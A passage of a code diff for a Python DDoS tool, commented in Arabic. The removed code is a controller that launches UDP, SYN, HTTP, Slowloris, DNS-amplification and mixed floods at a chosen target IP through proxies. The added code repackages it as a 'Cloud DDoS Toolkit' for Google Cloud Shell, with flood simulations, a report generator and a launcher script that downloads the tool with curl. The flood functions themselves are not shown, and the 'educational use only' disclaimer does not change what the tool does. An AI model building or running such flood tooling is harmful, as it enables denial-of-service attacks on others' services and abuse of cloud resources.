+            print(f"   {Colors.YELLOW}{key}:{Colors.END} {value}")
         
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            for method in methods:
-                for _ in range(threads_per_method):
-                    if method == "UDP":
-                        executor.submit(self.methods.udp_flood, target_ip, target_port, duration)
-                    elif method == "SYN":
-                        executor.submit(self.methods.tcp_syn_flood, target_ip, target_port, duration)
-                    elif method == "HTTP":
-                        executor.submit(self.methods.http_flood, target_ip, target_port, duration)
+        print(f"\n{Colors.GREEN}[+] Open Ports:{Colors.END}")
+        for port_info in analysis.get("open_ports", []):
+            print(f"   Port {port_info['port']}: {port_info['service']} - {port_info['status']}")
+    
+    def run_attack_simulations(self):
+        """تشغيل محاكاة الهجمات"""
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ ATTACK SIMULATIONS ══════════{Colors.END}")
         
-        print(f"{Colors.GREEN}[+] Mixed attack completed!{Colors.END}")
+        # تأكد من وجود خادم اختباري
+        print(f"{Colors.YELLOW}[?] Start test server? (y/n): {Colors.END}", end="")
+        if input().lower() == 'y':
+            self.utilities.start_test_server()
+        
+        # تشغيل المحاكاة الكاملة
+        results = self.simulator.run_complete_test_suite()
+        
+        print(f"\n{Colors.GREEN}[+] Simulations completed!{Colors.END}")
+        for method, count in results.items():
+            print(f"   {method}: {count:,}")
+    
+    def generate_full_report(self):
+        """توليد تقرير كامل"""
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ GENERATE REPORT ══════════{Colors.END}")
+        
+        # جمع البيانات
+        network_analysis = self.analyzer.analyze_local_network()
+        results = getattr(self.simulator, 'results', {})
+        
+        # توليد التقرير
+        html_report = self.report_generator.generate_html_report(
+            results, 
+            network_analysis
+        )
+        
+        # حفظ التقرير
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"security_report_{timestamp}.html"
+        
+        with open(filename, "w") as f:
+            f.write(html_report)
+        
+        print(f"{Colors.GREEN}[+] Report generated: {filename}{Colors.END}")
+        print(f"{Colors.GREEN}[+] File size: {os.path.getsize(filename)} bytes{Colors.END}")
+        
+        # عرض خيارات العرض
+        print(f"\n{Colors.YELLOW}View options:{Colors.END}")
+        print(f"1. {Colors.GREEN}cloudshell open {filename}{Colors.END}")
+        print(f"2. {Colors.GREEN}cat {filename} | head -50{Colors.END}")
+        print(f"3. {Colors.GREEN}python3 -m http.server 9000 &{Colors.END}")
+    
+    def run_individual_tests(self):
+        """اختبار الطرق الفردية"""
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ INDIVIDUAL TESTS ══════════{Colors.END}")
+        
+        tests = {
+            "1": ("UDP Flood", self.simulator.simulate_udp_flood),
+            "2": ("SYN Flood", self.simulator.simulate_syn_flood),
+            "3": ("HTTP Requests", self.simulator.simulate_http_requests),
+            "4": ("Slowloris", self.simulator.simulate_slowloris)
+        }
+        
+        for key, (name, _) in tests.items():
+            print(f"{Colors.GREEN}[{key}]{Colors.END} {name}")
+        
+        choice = input(f"\n{Colors.YELLOW}Select test (1-4): {Colors.END}")
+        
+        if choice in tests:
+            name, func = tests[choice]
+            print(f"\n{Colors.BLUE}[*] Running {name}...{Colors.END}")
+            result = func(duration=3)
+            print(f"{Colors.GREEN}[+] Result: {result:,}{Colors.END}")
+        else:
+            print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
     
     def show_statistics(self):
         """عرض الإحصائيات"""
-        if not self.statistics['start_time']:
-            print(f"{Colors.RED}[-] No attacks performed yet{Colors.END}")
+        if not self.simulator.results.get("methods_tested"):
+            print(f"{Colors.RED}[-] No simulations run yet{Colors.END}")
             return
         
-        elapsed = time.time() - self.statistics['start_time']
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ STATISTICS ══════════{Colors.END}")
         
-        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ STATISTICS ══════════{Colors.END}")
-        print(f"{Colors.YELLOW}Total Packets/Requests:{Colors.END} {self.statistics['total_packets']:,}")
-        print(f"{Colors.YELLOW}Attack Duration:{Colors.END} {elapsed:.1f} seconds")
-        print(f"{Colors.YELLOW}Methods Used:{Colors.END} {', '.join(self.statistics['methods_used'])}")
-        print(f"{Colors.YELLOW}Average Rate:{Colors.END} {self.statistics['total_packets']/elapsed:.1f}/s")
+        print(f"{Colors.CYAN}Methods Tested:{Colors.END}")
+        for method in self.simulator.results["methods_tested"]:
+            print(f"  • {method}")
         
-        # تقدير حجم البيانات
-        data_mb = (self.statistics['total_packets'] * 1024) / (1024 * 1024)
-        print(f"{Colors.YELLOW}Estimated Data Sent:{Colors.END} {data_mb:.2f} MB")
+        print(f"\n{Colors.CYAN}Total Packets/Requests:{Colors.END} {self.simulator.results.get('packets_sent', 0):,}")
+        
+        if self.simulator.results.get("start_time"):
+            duration = time.time() - self.simulator.results["start_time"]
+            print(f"{Colors.CYAN}Total Duration:{Colors.END} {duration:.1f} seconds")
     
-    def generate_report(self):
-        """توليد تقرير مفصل"""
-        report = f"""
-        =========================================
-        DDOS ATTACK ANALYSIS REPORT
-        =========================================
-        Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
-        Tool Version: {VERSION}
-        
-        ATTACK STATISTICS:
-        - Total Packets: {self.statistics['total_packets']:,}
-        - Methods Used: {', '.join(self.statistics['methods_used'])}
-        - Duration: {time.time() - self.statistics['start_time']:.1f}s
-        
-        TECHNICAL ANALYSIS:
-        1. UDP Flood: Best for bandwidth exhaustion
-        2. SYN Flood: Effective against connection limits
-        3. HTTP Flood: Application layer attack
-        4. Slowloris: Resource exhaustion
-        
-        DEFENSE RECOMMENDATIONS:
-        • Implement rate limiting
-        • Use DDoS protection services
-        • Configure firewalls properly
-        • Monitor network traffic
-        
-        LEGAL DISCLAIMER:
-        This report is for educational purposes only.
-        Unauthorized attacks are illegal.
-        =========================================
-        """
-        
-        filename = f"ddos_report_{int(time.time())}.txt"
-        with open(filename, 'w') as f:
-            f.write(report)
-        
-        print(f"{Colors.GREEN}[+] Report saved as: {filename}{Colors.END}")
-        return report
+    def run(self):
+        """تشغيل المتحكم الرئيسي"""
+        try:
+            # تحية أولية
+            print(f"{Colors.GREEN}[+] Cloud DDoS Toolkit v{VERSION}{Colors.END}")
+            print(f"{Colors.YELLOW}[!] For educational use only!{Colors.END}")
+            time.sleep(1)
+            
+            while True:
+                choice = self.show_main_menu()
+                
+                if choice == "0":
+                    print(f"\n{Colors.GREEN}[+] Exiting... Goodbye!{Colors.END}")
+                    break
+                elif choice == "1":
+                    self.quick_start_demo()
+                elif choice == "2":
+                    self.run_network_analysis()
+                elif choice == "3":
+                    self.run_attack_simulations()
+                elif choice == "4":
+                    self.generate_full_report()
+                elif choice == "5":
+                    self.run_individual_tests()
+                elif choice == "6":
+                    self.show_statistics()
+                else:
+                    print(f"{Colors.RED}[-] Invalid option{Colors.END}")
+                
+                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
+                
+        except KeyboardInterrupt:
+            print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")
+        except Exception as e:
+            print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
 
-# ==================== MAIN ====================
-def main():
-    """الدالة الرئيسية"""
-    show_banner()
-    security_check()
-    
-    controller = DDoSAttackController()
-    
-    while True:
-        choice = controller.show_menu()
-        
-        if choice == '0':
-            print(f"\n{Colors.GREEN}[+] Exiting... Goodbye!{Colors.END}")
-            break
-        
-        elif choice == '7':
-            controller.proxy_manager.load_proxies()
-            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.END}")
-        
-        elif choice == '8':
-            controller.show_statistics()
-            input(f"{Colors.Yellow}Press Enter to continue...{Colors.END}")
-        
-        elif choice in ['1', '2', '3', '4', '5', '6']:
-            target_ip, target_port, duration, threads = controller.get_target_info()
-            
-            if not target_ip:
-                continue
-            
-            # تحذير إضافي
-            confirm = input(f"{Colors.RED}Start attack? (y/n): {Colors.END}").lower()
-            if confirm != 'y':
-                continue
-            
-            if choice == '1':
-                result = controller.start_attack("UDP", target_ip, target_port, duration, threads)
-                print(f"{Colors.GREEN}[+] UDP Flood sent {result:,} packets{Colors.END}")
-            
-            elif choice == '2':
-                result = controller.start_attack("SYN", target_ip, target_port, duration, threads)
-                print(f"{Colors.GREEN}[+] SYN Flood sent {result:,} packets{Colors.END}")
-            
-            elif choice == '3':
-                result = controller.start_attack("HTTP", target_ip, target_port, duration, threads)
-                print(f"{Colors.GREEN}[+] HTTP Flood sent {result:,} requests{Colors.END}")
-            
-            elif choice == '4':
-                result = controller.start_attack("SLOWLORIS", target_ip, target_port, duration, threads)
-                print(f"{Colors.GREEN}[+] Slowloris opened {result:,} connections{Colors.END}")
-            
-            elif choice == '5':
-                result = controller.start_attack("DNS", target_ip, target_port, duration, threads)
-                print(f"{Colors.GREEN}[+] DNS Amplification sent {result:,} packets{Colors.END}")
-            
-            elif choice == '6':
-                controller.mixed_attack(target_ip, target_port, duration, threads)
-            
-            # توليد التقرير
-            report = controller.generate_report()
-            
-            input(f"\n{Colors.Yellow}Press Enter to continue...{Colors.END}")
-        
-        else:
-            print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
+# ==================== QUICK LAUNCH SCRIPT ====================
+def create_launch_script():
+    """إنشاء سكريبت تشغيل سريع لـ Cloud Shell"""
+    launch_script = """#!/bin/bash
+# Cloud DDoS Toolkit - Auto Launcher
+echo "=== Cloud DDoS Analysis Toolkit ==="
+echo "Setting up environment..."
 
-# ==================== REQUIREMENTS ====================
-def install_requirements():
-    """تثبيت المكتبات المطلوبة"""
-    requirements = """
-    requests==2.31.0
-    fake-useragent==1.4.0
-    """
-    
-    print(f"{Colors.YELLOW}[!] Installing requirements...{Colors.END}")
-    os.system("pip install requests fake-useragent")
+# إنشاء مجلد العمل
+mkdir -p ~/security_lab
+cd ~/security_lab
 
-# ==================== EXECUTION ====================
+# تحميل الأداة إذا لم تكن موجودة
+if [ ! -f "ddos_cloud_toolkit.py" ]; then
+    echo "Downloading toolkit..."
+    curl -s -o ddos_cloud_toolkit.py "RAW_GITHUB_URL_HERE"
+fi
+
+# تثبيت المتطلبات
+echo "Installing requirements..."
+pip3 install --upgrade pip > /dev/null 2>&1
+
+# تشغيل الأداة
+echo "Starting toolkit..."
+python3 ddos_cloud_toolkit.py
+"""
+    
+    with open("launch_toolkit.sh", "w") as f:
+        f.write(launch_script)
+    
+    os.chmod("launch_toolkit.sh", 0o755)
+    print(f"{Colors.GREEN}[+] Launch script created: launch_toolkit.sh{Colors.END}")
+
+# ==================== MAIN EXECUTION ====================
 if __name__ == "__main__":
-    try:
-        import requests
-        from fake_useragent import UserAgent
-    except ImportError:
-        print(f"{Colors.RED}[!] Requirements not installed!{Colors.END}")
-        install_requirements()
+    # التحقق من أننا على Cloud Shell (تقريبي)
+    is_cloud = "GOOGLE_CLOUD_PROJECT" in os.environ or "CLOUDSDK_CONFIG" in os.environ
     
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")
-    except Exception as e:
-        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
+    if not is_cloud:
+        print(f"{Colors.YELLOW}[!] Warning: Not running in Cloud Shell environment{Colors.END}")
+        print(f"{Colors.YELLOW}[!] Some features may be limited{Colors.END}")
+    
+    # إنشاء سكريبت التشغيل السريع
+    create_launch_script()
+    
+    # تشغيل المتحكم
+    controller = CloudDDOSController()
+    controller.run()
